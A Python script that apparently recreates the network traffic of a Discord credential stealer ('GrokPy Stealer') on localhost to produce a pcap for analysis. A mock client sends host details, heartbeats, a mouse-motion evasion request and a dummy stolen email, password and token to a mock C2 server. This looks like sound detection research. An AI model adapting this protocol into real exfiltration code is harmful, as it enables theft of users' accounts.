import time
import threading
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from scapy.all import sniff, wrpcap

# --- 配置参数 ---
HOST = '127.0.0.1'
PORT = 18008
PCAP_FILENAME = "grokpy_stealer_c2.pcap"

# --- 1. 模拟 C2 服务端 (Server) ---
class MockC2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # 禁用默认的 HTTP server 日志，保持控制台整洁
        pass

    def do_GET(self):
        print(f"[Server] 收到 GET 请求: {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"status": "ok"}')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"[Server] 收到 POST 请求: {self.path}")
        print(f"[Server] POST 负载: {post_data}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"status": "ok"}')

def start_mock_server():
    server = HTTPServer((HOST, PORT), MockC2Handler)
    print(f"[Server] 模拟 C&C 服务器启动，监听 {HOST}:{PORT}...")
    server.serve_forever()

# --- 2. 模拟被控端 (Client) ---
def start_mock_client():
    # 等待服务器和抓包器启动
    time.sleep(3)
    base_url = f"http://{HOST}:{PORT}"
    
    # 完美伪造报告中提到的 User-Agent 和 Headers
    headers = {
        "User-Agent": "python-requests/2.32.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

    try:
        # 1. 模拟发送主机信息
        print("\n[Client] 1. 正在发送主机硬件信息 (/log)...")
        payload_log = {
            "id": "IDK",
            "log_content": "[IDK] started [Unknown,Intel Core Processor (Broadwell),16,1280x720,156.146.63.145]",
            "b64_log": "[]"
        }
        requests.post(f"{base_url}/log", data=payload_log, headers=headers)
        time.sleep(1)

        # 2. 模拟发送心跳存活时间
        print("[Client] 2. 正在发送心跳状态 (/check)...")
        requests.get(f"{base_url}/check?seconds=980", headers=headers)
        time.sleep(1)

        # 3. 模拟请求鼠标移动轨迹规避检测
        print("[Client] 3. 正在请求鼠标拟人化轨迹 (/motion_gen/)...")
        params_motion = {
            "screenx": 1512, 
            "screeny": 991,
            "coordinates": '["[[100, 200], [150, 250], [200, 300]]", "[[100, 200], [150, 250]]"]',
            "frequency": 120, 
            "sv": 4.0, 
            "remove_v0": 1, 
            "c_delay": 0, 
            "rof": 3, 
            "key": 46733943
        }
        requests.get(f"{base_url}/motion_gen/", params=params_motion, headers=headers)
        time.sleep(1)

        # 4. 模拟回传窃取到的 Discord 账号密码和 Token
        print("[Client] 4. 正在回传窃取的账号信息 (/submit)...")
        payload_submit = {
            "email": "qckr9c8y@example.com",
            "password": "THEPCImnI",
            "token": "grHdpJnjFrpxujNTd2ZFYJund8rwzTjr8UGHmH18FoFoG5gXCVJaTN2ObaY"
        }
        requests.post(f"{base_url}/submit", data=payload_submit, headers=headers)
        time.sleep(1)
        
    except Exception as e:
        print(f"[Client] 请求发生错误: {e}")

# --- 3. 抓包器 (Sniffer) ---
def capture_traffic():
    print(f"[Sniffer] 开始抓取 lo 接口上端口 {PORT} 的 HTTP 流量 (持续 10 秒)...")
    bpf_filter = f"tcp port {PORT}"
    
    # 使用 lo 接口抓取环回流量
    packets = sniff(iface='lo', filter=bpf_filter, timeout=10)
    
    if len(packets) > 0:
        wrpcap(PCAP_FILENAME, packets)
        print(f"\n[Sniffer] 🎉 抓包成功！共捕获 {len(packets)} 个数据包，已保存至 {PCAP_FILENAME}")
    else:
        print("\n[Sniffer] 未捕获到任何数据包。")

if __name__ == "__main__":
    print("=== 开始模拟 GrokPy Stealer C2 流量 ===")
    
    # 启动服务端线程 (设为守护线程，主线程退出时自动结束)
    server_thread = threading.Thread(target=start_mock_server)
    server_thread.daemon = True
    server_thread.start()

    # 启动客户端线程
    client_thread = threading.Thread(target=start_mock_client)
    client_thread.daemon = True
    client_thread.start()

    # 主线程执行抓包，控制程序生命周期
    capture_traffic()
    
    print("=== 模拟结束 ===")